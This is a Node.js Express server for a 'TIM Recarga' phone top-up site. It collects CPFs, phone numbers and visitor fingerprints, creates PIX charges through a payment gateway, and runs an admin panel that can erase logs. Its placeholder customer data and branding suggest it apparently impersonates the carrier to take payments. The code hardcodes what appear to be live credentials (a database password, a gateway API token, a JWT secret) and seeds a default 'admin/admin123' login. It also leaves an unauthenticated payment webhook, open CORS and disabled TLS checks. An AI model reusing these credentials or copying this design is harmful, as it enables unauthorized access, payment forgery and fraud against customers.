const express = require('express');
const cors = require('cors');
const { Pool } = require('pg');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const bodyParser = require('body-parser');
const requestIp = require('request-ip');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;
const JWT_SECRET = process.env.JWT_SECRET || 'tim_recarga_secret_2026';
const JWT_EXPIRES = '24h';

const PLUMIFY_PRODUCT_HASH = process.env.PLUMIFY_PRODUCT_HASH || 'lxpykbkgfl';
const PLUMIFY_API_TOKEN = process.env.PLUMIFY_API_TOKEN || '1Vp6bm2wSoil2giHCGRjsZ9IGVbiHve4u8xbyUoRWpdvHUWYOj6wZ9yd0xVq';

app.use(cors({ origin: '*', credentials: true }));
app.use(bodyParser.json({ limit: '10mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));
app.use(requestIp.mw());
app.use(express.static(path.join(__dirname, 'public')));

// ============ POSTGRESQL DO CARALHO  ============

const pool = new Pool({
  connectionString: 'postgresql://recargabankerdb_user:EtGiOUgmuJxUZJbuQpUrEIdou8ZyzP9Y@dpg-db4oqup42hec73eeos4g-a/recargabankerdb',
  ssl: { rejectUnauthorized: false },
  max: 5,
  idleTimeoutMillis: 30000,
  connectionTimeoutMillis: 10000,
});

// ============ HELPERS ============
function getClientIP(req) {
  return req.clientIp || req.ip || req.headers['x-forwarded-for']?.split(',')[0] || 'unknown';
}

function sanitizarInput(input) {
  if (!input) return input;
  if (typeof input === 'string') return input.trim().replace(/[<>]/g, '');
  return input;
}

function isValidCPF(cpf) {
  cpf = String(cpf).replace(/[^\d]+/g, '');
  if (!cpf || cpf.length !== 11) return false;
  if (/^(\d)\1{10}$/.test(cpf)) return false;
  let add = 0;
  for (let i = 0; i < 9; i++) add += parseInt(cpf.charAt(i)) * (10 - i);
  let rev = 11 - (add % 11);
  if (rev === 10 || rev === 11) rev = 0;
  if (rev !== parseInt(cpf.charAt(9))) return false;
  add = 0;
  for (let i = 0; i < 10; i++) add += parseInt(cpf.charAt(i)) * (11 - i);
  rev = 11 - (add % 11);
  if (rev === 10 || rev === 11) rev = 0;
  if (rev !== parseInt(cpf.charAt(10))) return false;
  return true;
}

function parseValorParaCents(valor) {
  if (typeof valor === 'number') return Math.round(valor * 100);
  if (typeof valor !== 'string') return 0;
  const limpo = valor.replace(/\./g, '').replace(',', '.').replace(/[^\d.]/g, '');
  const n = parseFloat(limpo);
  return isNaN(n) ? 0 : Math.round(n * 100);
}

async function logSeguranca(usuario, acao, ip, detalhes) {
  try {
    await pool.query(
      'INSERT INTO logs (usuario, acao, ip, detalhes) VALUES ($1, $2, $3, $4)',
      [usuario || 'Sistema', acao, ip, detalhes]
    );
  } catch (e) { console.error('Erro log:', e.message); }
}

function authenticate(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'Não autorizado' });
  try {
    req.user = jwt.verify(token, JWT_SECRET);
    next();
  } catch {
    return res.status(401).json({ error: 'Token inválido' });
  }
}

// ============ INICIALIZAÇÃO DO BANCO ============
async function initDatabase() {
  const client = await pool.connect();
  try {
    console.log('Inicializando banco...');

    await client.query(`
      CREATE TABLE IF NOT EXISTS admin_users (
        id SERIAL PRIMARY KEY,
        username VARCHAR(50) UNIQUE NOT NULL,
        senha_hash TEXT NOT NULL,
        nome VARCHAR(100),
        email VARCHAR(100),
        ultimo_login TIMESTAMP,
        ip_login TEXT,
        criado_em TIMESTAMP DEFAULT NOW()
      )
    `);

    await client.query(`
      CREATE TABLE IF NOT EXISTS payments (
        id SERIAL PRIMARY KEY,
        transaction_id VARCHAR(100) UNIQUE,
        cpf VARCHAR(14),
        valor DECIMAL(10,2),
        status VARCHAR(20) DEFAULT 'pending',
        telefone VARCHAR(20),
        data_pagamento TIMESTAMP,
        criado_em TIMESTAMP DEFAULT NOW()
      )
    `);

    await client.query(`
      CREATE TABLE IF NOT EXISTS recargas (
        id SERIAL PRIMARY KEY,
        transaction_id VARCHAR(100) UNIQUE NOT NULL,
        telefone VARCHAR(20) NOT NULL,
        cpf VARCHAR(14) NOT NULL,
        valor DECIMAL(10,2) NOT NULL,
        bonus VARCHAR(100),
        status VARCHAR(20) DEFAULT 'pendente',
        pix_code TEXT,
        ip TEXT,
        criado_em TIMESTAMP DEFAULT NOW(),
        pago_em TIMESTAMP
      )
    `);

    await client.query(`
      CREATE TABLE IF NOT EXISTS clientes (
        id SERIAL PRIMARY KEY,
        nome VARCHAR(100),
        cpf VARCHAR(14),
        telefone VARCHAR(20),
        email VARCHAR(100),
        ip TEXT,
        criado_em TIMESTAMP DEFAULT NOW()
      )
    `);

    await client.query(`
      CREATE TABLE IF NOT EXISTS logs (
        id SERIAL PRIMARY KEY,
        usuario VARCHAR(100),
        acao VARCHAR(50),
        ip TEXT,
        detalhes TEXT,
        data TIMESTAMP DEFAULT NOW()
      )
    `);

    await client.query(`
      CREATE TABLE IF NOT EXISTS visitantes (
        id SERIAL PRIMARY KEY,
        ip TEXT,
        user_agent TEXT,
        screen TEXT,
        language TEXT,
        referer TEXT,
        pagina TEXT,
        timestamp TIMESTAMP DEFAULT NOW()
      )
    `);

    // Índices
    await client.query(`CREATE INDEX IF NOT EXISTS idx_recargas_status ON recargas(status);`);
    await client.query(`CREATE INDEX IF NOT EXISTS idx_payments_tid ON payments(transaction_id);`);
    await client.query(`CREATE INDEX IF NOT EXISTS idx_logs_data ON logs(data DESC);`);

    // Admin padrão
    const adminCheck = await client.query('SELECT * FROM admin_users WHERE username = $1', ['admin']);
    if (adminCheck.rows.length === 0) {
      const hashedPassword = bcrypt.hashSync('admin123', 10);
      await client.query(
        `INSERT INTO admin_users (username, senha_hash, nome, email, ultimo_login, ip_login)
         VALUES ($1, $2, $3, $4, NOW(), $5)`,
        ['admin', hashedPassword, 'Administrador', 'admin@timrecarga.com', '127.0.0.1']
      );
      console.log('Admin padrão criado: admin / admin123');
    }

    console.log('Banco de dados pronto.');
  } catch (err) {
    console.error('Erro ao inicializar banco:', err.message);
  } finally {
    client.release();
  }
}

initDatabase();

// ============================================================
// ROTAS PÚBLICAS
// ============================================================

// CRIAR RECARGA + PIX (PLUMIFY)
app.post('/api/create-sale', async (req, res) => {
  const { phone, cpf, value, bonus } = req.body;
  const ip = getClientIP(req);

  if (!phone || !cpf || !value) {
    return res.status(400).json({ success: false, message: 'Dados incompletos' });
  }
  if (!isValidCPF(cpf)) {
    return res.status(400).json({ success: false, message: 'CPF inválido' });
  }

  const valorCents = parseValorParaCents(value);
  if (valorCents < 100) {
    return res.status(400).json({ success: false, message: 'Valor mínimo R$ 1,00' });
  }

  const payload = {
    amount: valorCents,
    offer_hash: PLUMIFY_PRODUCT_HASH,
    payment_method: 'pix',
    customer: {
      name: 'Cliente TIM Recarga',
      email: 'cliente@timrecarga.com',
      phone_number: phone.replace(/\D/g, ''),
      document: cpf.replace(/\D/g, ''),
      street_name: 'Rua Exemplo',
      number: '100',
      neighborhood: 'Centro',
      city: 'Fortaleza',
      state: 'CE',
      zip_code: '60000000'
    },
    cart: [{
      product_hash: PLUMIFY_PRODUCT_HASH,
      title: 'Recarga TIM',
      price: valorCents,
      quantity: 1,
      operation_type: 1,
      tangible: false
    }],
    expire_in_days: 1,
    transaction_origin: 'api',
    postback_url: `${process.env.BASE_URL || 'https://seu-app.onrender.com'}/api/webhook/pagamento`
  };

  try {
    const response = await fetch(
      `https://api.Plumify.com.br/api/public/v1/transactions?api_token=${PLUMIFY_API_TOKEN}`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      }
    );
    const data = await response.json();

    if (data.pix && data.pix.pix_qr_code) {
      const valorTexto = (valorCents / 100).toFixed(2);

      await pool.query(
        `INSERT INTO payments (transaction_id, cpf, valor, status, telefone)
         VALUES ($1,$2,$3,'pending',$4)
         ON CONFLICT (transaction_id) DO NOTHING`,
        [data.hash, cpf, valorTexto, phone]
      ).catch(e => console.log('Erro payments:', e.message));

      await pool.query(
        `INSERT INTO recargas (transaction_id, telefone, cpf, valor, bonus, status, pix_code, ip)
         VALUES ($1,$2,$3,$4,$5,'pendente',$6,$7)
         ON CONFLICT (transaction_id) DO NOTHING`,
        [data.hash, phone, cpf, valorTexto, bonus || '', data.pix.pix_qr_code, ip]
      ).catch(e => console.log('Erro recargas:', e.message));

      // Grava cliente (se ainda não existir pelo CPF)
      await pool.query(
        `INSERT INTO clientes (nome, cpf, telefone, ip)
         SELECT 'Cliente TIM', $1, $2, $3
         WHERE NOT EXISTS (SELECT 1 FROM clientes WHERE cpf = $1)`,
        [cpf, phone, ip]
      ).catch(e => console.log('Erro cliente:', e.message));

      await logSeguranca('Sistema', 'recarga_criada', ip, `R$ ${valorTexto} - ${phone}`);

      return res.json({
        success: true,
        data: {
          transactionId: data.hash,
          paymentData: {
            copyPaste: data.pix.pix_qr_code,
            qrCode: data.pix.pix_qr_code,
            qrCodeBase64: data.pix.pix_qr_code_base64 || null
          }
        }
      });
    }

    return res.status(400).json({ success: false, message: data.message || 'Erro ao gerar PIX' });
  } catch (error) {
    console.error('Erro create-sale:', error);
    return res.status(500).json({ success: false, message: 'Erro ao gerar pagamento' });
  }
});

// CONSULTAR STATUS
app.get('/api/sale-status', async (req, res) => {
  try {
    const { transactionId } = req.query;
    if (!transactionId) {
      return res.status(400).json({ success: false, message: 'transactionId obrigatório' });
    }
    const result = await pool.query(
      'SELECT status FROM payments WHERE transaction_id = $1',
      [transactionId]
    );
    if (result.rows.length === 0) {
      return res.status(404).json({ success: false, message: 'Recarga não encontrada' });
    }
    const raw = String(result.rows[0].status).toLowerCase();
    const status = raw === 'paid' ? 'PAID' : raw === 'pending' ? 'PENDING' : raw.toUpperCase();
    return res.json({ success: true, data: { status, transactionId } });
  } catch (error) {
    console.error('Erro sale-status:', error);
    return res.status(500).json({ success: false, message: 'Erro ao consultar' });
  }
});

// WEBHOOK PLUMIFY
app.post('/api/webhook/pagamento', async (req, res) => {
  const { hash, status } = req.body;
  if (status === 'paid' && hash) {
    try {
      await pool.query(
        `UPDATE payments SET status = 'paid', data_pagamento = NOW() WHERE transaction_id = $1`,
        [hash]
      );
      await pool.query(
        `UPDATE recargas SET status = 'pago', pago_em = NOW() WHERE transaction_id = $1`,
        [hash]
      );
      await logSeguranca('Sistema', 'pagamento_confirmado', 'webhook', `Transação: ${hash}`);
      console.log(`Pagamento confirmado: ${hash}`);
    } catch (e) {
      console.error('Erro webhook:', e.message);
    }
  }
  res.json({ received: true });
});

// VISITANTE
app.post('/api/visitante', async (req, res) => {
  try {
    const { screen, pagina } = req.body;
    const ip = getClientIP(req);
    await pool.query(
      `INSERT INTO visitantes (ip, user_agent, screen, language, referer, pagina)
       VALUES ($1,$2,$3,$4,$5,$6)`,
      [
        ip,
        req.headers['user-agent'] || 'Desconhecido',
        screen || 'Desconhecido',
        req.headers['accept-language'] || 'pt-BR',
        req.headers['referer'] || 'Direto',
        pagina || 'Desconhecida'
      ]
    );
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ============================================================
// ROTAS ADMIN
// ============================================================

// LOGIN
app.post('/api/admin/login', async (req, res) => {
  const { username, password } = req.body;
  const ip = getClientIP(req);

  try {
    const result = await pool.query('SELECT * FROM admin_users WHERE username = $1', [username]);
    if (result.rows.length === 0) {
      return res.status(401).json({ error: 'Credenciais inválidas' });
    }

    const valid = await bcrypt.compare(password, result.rows[0].senha_hash);
    if (!valid) {
      await logSeguranca('Sistema', 'login_falha', ip, `Senha incorreta: ${username}`);
      return res.status(401).json({ error: 'Credenciais inválidas' });
    }

    await pool.query(
      'UPDATE admin_users SET ultimo_login = NOW(), ip_login = $1 WHERE id = $2',
      [ip, result.rows[0].id]
    );
    await logSeguranca(result.rows[0].nome || 'Admin', 'login', ip, 'Login realizado');

    const token = jwt.sign(
      { id: result.rows[0].id, username: result.rows[0].username, nome: result.rows[0].nome || 'Admin' },
      JWT_SECRET,
      { expiresIn: JWT_EXPIRES }
    );

    res.json({
      success: true,
      token,
      user: {
        id: result.rows[0].id,
        username: result.rows[0].username,
        nome: result.rows[0].nome || 'Administrador',
        email: result.rows[0].email || ''
      }
    });
  } catch (error) {
    console.error('Erro login:', error);
    res.status(500).json({ error: 'Erro interno' });
  }
});

// VERIFY
app.get('/api/admin/verify', authenticate, (req, res) => {
  res.json({ valid: true, user: req.user });
});

// TROCAR SENHA
app.post('/api/admin/trocar-senha', authenticate, async (req, res) => {
  const { senhaAtual, novaSenha } = req.body;
  const ip = getClientIP(req);
  try {
    const result = await pool.query('SELECT * FROM admin_users WHERE id = $1', [req.user.id]);
    if (result.rows.length === 0) return res.status(404).json({ error: 'Usuário não encontrado' });

    const valid = await bcrypt.compare(senhaAtual, result.rows[0].senha_hash);
    if (!valid) {
      await logSeguranca(req.user.nome, 'troca_senha_falha', ip, 'Senha atual incorreta');
      return res.status(401).json({ error: 'Senha atual incorreta' });
    }

    const hashedPassword = bcrypt.hashSync(novaSenha, 10);
    await pool.query('UPDATE admin_users SET senha_hash = $1 WHERE id = $2', [hashedPassword, req.user.id]);
    await logSeguranca(req.user.nome, 'troca_senha', ip, 'Senha alterada');
    res.json({ success: true, message: 'Senha alterada com sucesso' });
  } catch (error) {
    console.error('Erro trocar senha:', error);
    res.status(500).json({ error: 'Erro ao alterar senha' });
  }
});

// DASHBOARD
app.get('/api/admin/dashboard', authenticate, async (req, res) => {
  try {
    const totalRecargas = await pool.query('SELECT COUNT(*) FROM recargas');
    const recargasPagas = await pool.query("SELECT COUNT(*) FROM recargas WHERE status = 'pago'");
    const recargasPendentes = await pool.query("SELECT COUNT(*) FROM recargas WHERE status = 'pendente'");
    const totalRevenue = await pool.query("SELECT COALESCE(SUM(valor), 0) AS total FROM recargas WHERE status = 'pago'");
    const totalVisitantes = await pool.query('SELECT COUNT(*) FROM visitantes');
    const totalPagamentos = await pool.query('SELECT COUNT(*) FROM payments');
    const totalClientes = await pool.query('SELECT COUNT(*) FROM clientes');

    const revenueByDay = await pool.query(`
      SELECT TO_CHAR(criado_em, 'DD/MM') AS dia, COALESCE(SUM(valor), 0) AS total
      FROM recargas
      WHERE status = 'pago'
      GROUP BY dia
      ORDER BY MAX(criado_em) DESC
      LIMIT 7
    `);

    const logs = await pool.query('SELECT * FROM logs ORDER BY data DESC LIMIT 15');
    const recargasRecentes = await pool.query('SELECT * FROM recargas ORDER BY criado_em DESC LIMIT 10');

    res.json({
      stats: {
        totalRecargas: parseInt(totalRecargas.rows[0].count),
        recargasPagas: parseInt(recargasPagas.rows[0].count),
        recargasPendentes: parseInt(recargasPendentes.rows[0].count),
        totalRevenue: parseFloat(totalRevenue.rows[0].total) || 0,
        totalVisitantes: parseInt(totalVisitantes.rows[0].count),
        totalPagamentos: parseInt(totalPagamentos.rows[0].count),
        totalClientes: parseInt(totalClientes.rows[0].count)
      },
      revenueByDay: revenueByDay.rows,
      recentLogs: logs.rows,
      recentRecargas: recargasRecentes.rows
    });
  } catch (error) {
    console.error('Erro dashboard:', error);
    res.status(500).json({ error: error.message });
  }
});

// RECARGAS
app.get('/api/admin/recargas', authenticate, async (req, res) => {
  try {
    const { status, search, limit = 200 } = req.query;
    let query = 'SELECT * FROM recargas';
    const params = [];
    const where = [];
    if (status) { params.push(status); where.push(`status = $${params.length}`); }
    if (search) {
      params.push(`%${search}%`);
      where.push(`(telefone ILIKE $${params.length} OR cpf ILIKE $${params.length} OR transaction_id ILIKE $${params.length})`);
    }
    if (where.length) query += ' WHERE ' + where.join(' AND ');
    query += ` ORDER BY criado_em DESC LIMIT ${parseInt(limit, 10)}`;
    const result = await pool.query(query, params);
    res.json(result.rows);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.put('/api/admin/recargas/:id', authenticate, async (req, res) => {
  try {
    const { status } = req.body;
    const allowed = ['pendente', 'pago', 'cancelado', 'falhou'];
    if (!allowed.includes(status)) return res.status(400).json({ error: 'Status inválido' });
    await pool.query('UPDATE recargas SET status = $1 WHERE id = $2', [status, req.params.id]);
    await logSeguranca(req.user.nome, 'editar_recarga', getClientIP(req), `ID: ${req.params.id} -> ${status}`);
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.delete('/api/admin/recargas/:id', authenticate, async (req, res) => {
  try {
    await pool.query('DELETE FROM recargas WHERE id = $1', [req.params.id]);
    await logSeguranca(req.user.nome, 'delete_recarga', getClientIP(req), `ID: ${req.params.id}`);
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// PAGAMENTOS
app.get('/api/admin/pagamentos', authenticate, async (req, res) => {
  try {
    const result = await pool.query('SELECT * FROM payments ORDER BY criado_em DESC');
    res.json(result.rows);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// CLIENTES
app.get('/api/admin/clientes', authenticate, async (req, res) => {
  try {
    const result = await pool.query('SELECT * FROM clientes ORDER BY criado_em DESC');
    res.json(result.rows);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// VISITANTES
app.get('/api/admin/visitantes', authenticate, async (req, res) => {
  try {
    const result = await pool.query('SELECT * FROM visitantes ORDER BY timestamp DESC LIMIT 200');
    res.json(result.rows);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.delete('/api/admin/visitantes', authenticate, async (req, res) => {
  try {
    await pool.query('DELETE FROM visitantes');
    await logSeguranca(req.user.nome, 'limpeza_visitantes', getClientIP(req), 'Visitantes limpos');
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// LOGS
app.get('/api/admin/logs', authenticate, async (req, res) => {
  try {
    const limit = parseInt(req.query.limit) || 100;
    const result = await pool.query('SELECT * FROM logs ORDER BY data DESC LIMIT $1', [limit]);
    res.json(result.rows);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.delete('/api/admin/logs', authenticate, async (req, res) => {
  try {
    await pool.query('DELETE FROM logs');
    await logSeguranca(req.user.nome, 'limpeza_logs', getClientIP(req), 'Logs limpos');
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// HEALTH
app.get('/health', async (req, res) => {
  try {
    await pool.query('SELECT 1');
    res.json({ ok: true, db: 'conectado' });
  } catch {
    res.status(500).json({ ok: false, db: 'erro' });
  }
});

// PÁGINAS
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin', 'index.html')));
app.get('/recarga/pagamento', (req, res) => res.sendFile(path.join(__dirname, 'public', 'recarga', 'pagamento.html')));
app.get('/recarga/pix', (req, res) => res.sendFile(path.join(__dirname, 'public', 'recarga', 'pix.html')));

app.listen(PORT, '0.0.0.0', () => {
  console.log('');
  console.log('=================================================');
  console.log('  TIM RECARGA - Servidor Online');
  console.log('  Site:  http://localhost:' + PORT);
  console.log('  Admin: http://localhost:' + PORT + '/admin');
  console.log('  Login: admin / admin123');
  console.log('=================================================');
  console.log('');
});

module.exports = app;
